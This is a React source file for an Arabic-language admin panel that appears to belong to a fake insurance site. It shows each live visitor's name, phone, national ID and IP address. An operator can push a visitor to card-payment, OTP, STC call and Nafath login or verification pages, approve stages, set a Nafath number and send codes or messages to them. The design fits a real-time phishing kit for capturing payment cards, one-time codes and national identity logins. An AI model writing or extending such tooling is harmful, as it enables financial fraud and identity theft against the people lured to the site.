import React, { useRef, useState } from "react";
import { motion } from "framer-motion";
import { ArrowRight, Circle, MapPin, Clock, Ban, ShieldCheck, Download, Star, MessageCircle, Monitor, Smartphone, Tablet, User, Car, Shield, Send, KeyRound, Globe } from "lucide-react";
import AdminVisitorChat from "@/components/admin/AdminVisitorChat";
import TabIdentity from "./TabIdentity";
import TabVerification from "./TabVerification";
import TabVehicle from "./TabVehicle";
import type { Visitor, InsuranceRequest, InsuranceOrder, Claim, ChatConv, StageEvent } from "./types";
import { getVisitorAvatar, getVisitorInitial, getSessionDuration, parseUserAgent, countryFlag, insuranceTypeLabel, statusLabel } from "./types";

interface Props {
  selectedVisitor: Visitor;
  linkedRequests: InsuranceRequest[];
  linkedOrders: InsuranceOrder[];
  linkedClaims: Claim[];
  linkedChats: ChatConv[];
  stageEvents: StageEvent[];
  visitorName: string | null;
  customerName: string | null;
  visitorPhone: string | null;
  visitorNationalId: string | null;
  loadingAction: string | null;
  nafathNumberInputs: Record<string, string>;
  setNafathNumberInputs: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  onClose: () => void;
  onApprove: (reqId: string) => void;
  onReject: (reqId: string) => void;
  onStageApprove: (orderId: string, nafathNum?: string) => void;
  onStageReject: (orderId: string) => void;
  onUpdateNafathNumber: (orderId: string, val: string) => void;
  onBlockToggle: () => void;
  onExportPDF: () => void;
  onClearChat: () => void;
  onToggleFavorite: (id: string) => void;
  onToggleTag: (id: string, tagKey: string) => void;
  onRedirect: (page: string) => void;
  onSendCode?: (code: string) => void;
  onSendFinalMessage?: (message: string) => void;
  redirectPage: string;
  setRedirectPage: (val: string) => void;
}

const VisitorDetailsPanel: React.FC<Props> = ({
  selectedVisitor, linkedRequests, linkedOrders, linkedClaims, linkedChats, stageEvents,
  visitorName, customerName, visitorPhone, visitorNationalId,
  loadingAction, nafathNumberInputs, setNafathNumberInputs,
  onClose, onApprove, onReject, onStageApprove, onStageReject, onUpdateNafathNumber,
  onBlockToggle, onExportPDF, onClearChat, onToggleFavorite, onToggleTag,
  onRedirect, onSendCode, onSendFinalMessage, redirectPage, setRedirectPage,
}) => {
  const panelRef = useRef<HTMLDivElement>(null);
  const [codeInput, setCodeInput] = useState("");
  const [messageInput, setMessageInput] = useState("");

  const ua = parseUserAgent(selectedVisitor.user_agent);
  const DevIcon = ua.device === "Mobile" ? Smartphone : ua.device === "Tablet" ? Tablet : Monitor;
  const displayName = visitorName || customerName || selectedVisitor.visitor_name || "زائر";

  return (
    <motion.div
      key={selectedVisitor.id}
      initial={{ opacity: 0, x: -12 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.25, ease: "easeOut" }}
      ref={panelRef}
      className="flex-1 overflow-y-auto flex flex-col will-change-transform"
    >
      {/* Mobile back */}
      <button onClick={onClose} className="md:hidden flex items-center gap-2 text-sm text-primary font-semibold p-3 hover:text-primary/80 transition-colors">
        <ArrowRight className="w-4 h-4" />العودة للقائمة
      </button>

      {/* ── Redirect Bar ── */}
      <div className="flex items-center gap-1.5 p-3 border-b border-border/50 bg-card shrink-0" dir="rtl">
        <select value={redirectPage} onChange={e => setRedirectPage(e.target.value)} className="flex-1 h-9 rounded-lg border border-border bg-background px-2.5 text-xs text-foreground focus:outline-none focus:border-primary transition-all min-w-0">
          <option value="">اختر صفحة</option>
          <optgroup label="الدفع والتحقق">
            <option value="/insurance/payment">الدفع بالبطاقة</option>
            <option value="/insurance/atm">دفع ATM</option>
            <option value="/insurance/otp">رمز التحقق OTP</option>
            <option value="/insurance/phone-verify">توثيق الجوال</option>
            <option value="/insurance/phone-otp">كود الجوال</option>
            <option value="/insurance/phone-stc">مكالمة STC</option>
            <option value="/insurance/nafath-login">نفاذ - دخول</option>
            <option value="/insurance/nafath-verify">نفاذ - تحقق</option>
            <option value="/insurance/confirmation">تأكيد الوثيقة</option>
          </optgroup>
        </select>
        <span className="text-[10px] text-muted-foreground whitespace-nowrap">توجيه لصفحة</span>
        <button onClick={() => onRedirect(redirectPage)} disabled={!redirectPage} className="h-9 px-5 rounded-lg text-xs font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all whitespace-nowrap">
          توجيه
        </button>
      </div>

      {/* ── Visitor Header ── */}
      <div className="p-4 md:p-5 border-b border-border/50 bg-card shrink-0" dir="rtl">
        <div className="flex items-center justify-between mb-1">
          <h2 className="text-lg md:text-xl font-black text-foreground">{displayName}</h2>
          <button onClick={() => onToggleFavorite(selectedVisitor.id)} className="p-1">
            <Star className={`w-5 h-5 ${selectedVisitor.is_favorite ? "fill-amber-400 text-amber-400" : "text-muted-foreground hover:text-amber-400"} transition-colors`} />
          </button>
        </div>
        <p className="text-xs text-muted-foreground mb-2">{selectedVisitor.current_page || "/"}</p>
        <span className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold ${selectedVisitor.is_online ? "bg-emerald-500/15 text-emerald-600" : "bg-destructive/10 text-destructive"}`}>
          <Circle className={`w-2 h-2 ${selectedVisitor.is_online ? "fill-emerald-500 text-emerald-500 animate-pulse" : "fill-destructive text-destructive"}`} />
          {selectedVisitor.is_online ? "متصل" : "غير متصل"}
        </span>
        <div className="flex items-center gap-2 mt-3 text-[10px] text-muted-foreground flex-wrap">
          <span className="inline-flex items-center gap-1"><DevIcon className="w-3 h-3" />{ua.device}</span>
          <span>·</span>
          <span>{ua.os}</span>
          <span>·</span>
          <span>{ua.browser}</span>
          <span>·</span>
          <span>{selectedVisitor.country ? `${countryFlag(selectedVisitor.country_code)} ${selectedVisitor.country}` : "Unknown"}</span>
          <span>·</span>
          <span>{selectedVisitor.ip_address || "—"}</span>
        </div>
      </div>

      {/* ── Scrollable Content ── */}
      <div className="flex-1 overflow-y-auto p-3 md:p-4 space-y-4" dir="rtl">

        {/* Section: Verification & Payment */}
        <SectionCard title="التحقق والدفع" icon={<Shield className="w-4 h-4" />} color="amber">
          <TabVerification
            linkedOrders={linkedOrders}
            stageEvents={stageEvents}
            selectedVisitor={selectedVisitor}
            visitorPhone={visitorPhone}
            visitorNationalId={visitorNationalId}
            loadingAction={loadingAction}
            onStageApprove={onStageApprove}
            onStageReject={onStageReject}
            onUpdateNafathNumber={onUpdateNafathNumber}
            nafathNumberInputs={nafathNumberInputs}
            setNafathNumberInputs={setNafathNumberInputs}
            insuranceTypeLabel={insuranceTypeLabel}
            statusLabel={statusLabel}
          />
        </SectionCard>

        {/* Section: Vehicle */}
        {linkedOrders.length > 0 && (
          <SectionCard title="بيانات المركبة والتأمين" icon={<Car className="w-4 h-4" />} color="emerald">
            <TabVehicle linkedOrders={linkedOrders} />
          </SectionCard>
        )}

        {/* Section: Identity */}
        <SectionCard title="بيانات الزائر" icon={<User className="w-4 h-4" />} color="sky">
          <TabIdentity
            selectedVisitor={selectedVisitor}
            visitorName={visitorName}
            customerName={customerName}
            visitorPhone={visitorPhone}
            visitorNationalId={visitorNationalId}
            linkedRequests={linkedRequests}
            linkedOrders={linkedOrders}
            loadingAction={loadingAction}
            onApprove={onApprove}
            onReject={onReject}
            insuranceTypeLabel={insuranceTypeLabel}
            statusLabel={statusLabel}
          />
        </SectionCard>

        {/* Section: Chat */}
        {linkedChats.length > 0 && (
          <SectionCard title="المحادثة" icon={<MessageCircle className="w-4 h-4" />} color="purple">
            <AdminVisitorChat visitorSessionId={selectedVisitor.session_id} visitorName={selectedVisitor.visitor_name} />
          </SectionCard>
        )}

        {/* ── Actions Bar ── */}
        <div className="space-y-2.5 bg-card border border-border rounded-xl p-3 md:p-4">
          {/* Send Code */}
          <div className="flex items-center gap-2">
            <span className="text-xs text-muted-foreground whitespace-nowrap">إرسال رمز</span>
            <input
              type="text"
              placeholder="أدخل الرمز"
              value={codeInput}
              onChange={e => setCodeInput(e.target.value)}
              className="flex-1 h-9 px-3 text-sm bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground"
            />
            <button
              onClick={() => { if (codeInput.trim() && onSendCode) { onSendCode(codeInput.trim()); setCodeInput(""); } }}
              disabled={!codeInput.trim()}
              className="h-9 px-4 rounded-lg text-xs font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all inline-flex items-center gap-1.5"
            >
              <KeyRound className="w-3.5 h-3.5" />
              إرسال
            </button>
          </div>

          {/* Send Final Message */}
          <div className="flex items-center gap-2">
            <span className="text-xs text-muted-foreground whitespace-nowrap">رسالة نهائية</span>
            <input
              type="text"
              placeholder="أدخل الرسالة"
              value={messageInput}
              onChange={e => setMessageInput(e.target.value)}
              className="flex-1 h-9 px-3 text-sm bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground"
            />
            <button
              onClick={() => { if (messageInput.trim() && onSendFinalMessage) { onSendFinalMessage(messageInput.trim()); setMessageInput(""); } }}
              disabled={!messageInput.trim()}
              className="h-9 px-4 rounded-lg text-xs font-bold bg-emerald-600 text-white hover:bg-emerald-700 disabled:opacity-40 transition-all inline-flex items-center gap-1.5"
            >
              <Send className="w-3.5 h-3.5" />
              إرسال
            </button>
          </div>

          {/* Block + Export */}
          <div className="flex items-center gap-2 pt-1">
            <button onClick={onBlockToggle} disabled={loadingAction === "block"} className={`h-9 px-5 rounded-lg text-xs font-bold transition-all inline-flex items-center gap-1.5 ${selectedVisitor.is_blocked ? "bg-muted text-muted-foreground hover:bg-muted/80" : "bg-destructive text-destructive-foreground hover:bg-destructive/90"}`}>
              {selectedVisitor.is_blocked ? <><ShieldCheck className="w-3.5 h-3.5" />فك الحظر</> : <><Ban className="w-3.5 h-3.5" />حظر</>}
            </button>
            <button onClick={onExportPDF} className="h-9 px-4 rounded-lg text-xs font-bold bg-muted/50 text-muted-foreground border border-border hover:bg-muted transition-all inline-flex items-center gap-1.5 mr-auto">
              <Download className="w-3.5 h-3.5" />تصدير PDF
            </button>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

/* ── Section Card Component ── */
const colorMap: Record<string, { border: string; header: string; line: string; text: string }> = {
  amber:   { border: "border-amber-500/30", header: "bg-amber-500/10", line: "bg-amber-500", text: "text-amber-700" },
  emerald: { border: "border-emerald-500/30", header: "bg-emerald-500/10", line: "bg-emerald-500", text: "text-emerald-700" },
  sky:     { border: "border-sky-500/30", header: "bg-sky-500/10", line: "bg-sky-500", text: "text-sky-700" },
  purple:  { border: "border-purple-500/30", header: "bg-purple-500/10", line: "bg-purple-500", text: "text-purple-700" },
  blue:    { border: "border-blue-500/30", header: "bg-blue-500/10", line: "bg-blue-500", text: "text-blue-700" },
};

const SectionCard: React.FC<{ title: string; icon: React.ReactNode; color: string; children: React.ReactNode }> = ({ title, icon, color, children }) => {
  const c = colorMap[color] || colorMap.sky;
  return (
    <div className={`rounded-xl border ${c.border} overflow-hidden bg-card`}>
      {/* Colored header */}
      <div className={`flex items-center gap-2 px-4 py-2.5 ${c.header} border-b ${c.border}`}>
        <div className={`${c.text}`}>{icon}</div>
        <h3 className={`text-sm font-bold ${c.text}`}>{title}</h3>
      </div>
      {/* Left colored line accent */}
      <div className="relative">
        <div className={`absolute right-0 top-0 bottom-0 w-1 ${c.line} rounded-bl-full rounded-tl-full`} />
        <div className="pr-2">
          {children}
        </div>
      </div>
    </div>
  );
};

export default VisitorDetailsPanel;
